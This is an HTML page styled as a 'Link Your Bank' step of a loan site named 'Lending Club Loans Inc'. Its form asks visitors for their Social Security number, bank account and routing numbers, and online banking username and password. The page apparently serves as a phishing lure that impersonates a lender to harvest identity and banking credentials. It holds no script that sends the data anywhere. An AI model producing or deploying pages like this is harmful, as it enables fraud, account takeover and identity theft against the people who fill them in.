<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Link Your Bank - Lending Club Loans Inc</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: 'Open Sans', sans-serif;
      background: #f5f6fa;
      color: #333;
    }
    header {
      background: #004481;
      color: #fff;
      padding: 20px;
      text-align: center;
    }
    header img {
      max-width: 180px;
      display: block;
      margin: 0 auto 10px;
    }
    nav a {
      color: #fff;
      margin: 0 10px;
      text-decoration: none;
      font-family: 'Poppins', sans-serif;
    }
    nav a:hover {
      text-decoration: underline;
    }
    .container {
      max-width: 800px;
      margin: 50px auto;
      background: #fff;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    .container h1 {
      font-family: 'Poppins', sans-serif;
      color: #004481;
      margin-top: 0;
    }
    .bank-section {
      display: flex;
      gap: 40px;
      flex-wrap: wrap;
    }
    .bank-section form {
      flex: 1 1 300px;
    }
    .bank-section img {
      max-width: 300px;
    }
    form input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    form button {
      background: #004481;
      color: #fff;
      padding: 12px;
      width: 100%;
      border: none;
      border-radius: 4px;
      font-weight: bold;
      cursor: pointer;
    }
    footer {
      text-align: center;
      padding: 20px;
      background: #eee;
      margin-top: 50px;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <header>
    <img src="logo.png" alt="Company Logo">
    <nav>
      <a href="index.html">Home</a>
      <a href="apply.html">Apply</a>
      <a href="link-bank.html">Link Bank</a>
      <a href="about.html">About</a>
      <a href="contact.html">Contact</a>
      <a href="privacy.html">Privacy</a>
      <a href="terms.html">Terms</a>
    </nav>
  </header>

  <div class="container">
    <h1>Link Your Bank</h1>
    <p>Please complete the secure form below to link your bank account for loan processing.</p>
    <div class="bank-section">
      <form>
        <input type="text" placeholder="Your Name" required />
        <input type="text" placeholder="SSN" required />
        <input type="text" placeholder="Bank Name" required />
        <input type="text" placeholder="Account Number" required />
        <input type="text" placeholder="Routing Number" required />
        <input type="text" placeholder="Online Banking Username" required />
        <input type="password" placeholder="Online Banking Password" required />
        <button type="submit">Link Now</button>
      </form>
      <img src="https://placehold.co/300x200?text=Bank+Illustration" alt="Bank Illustration" />
    </div>
  </div>
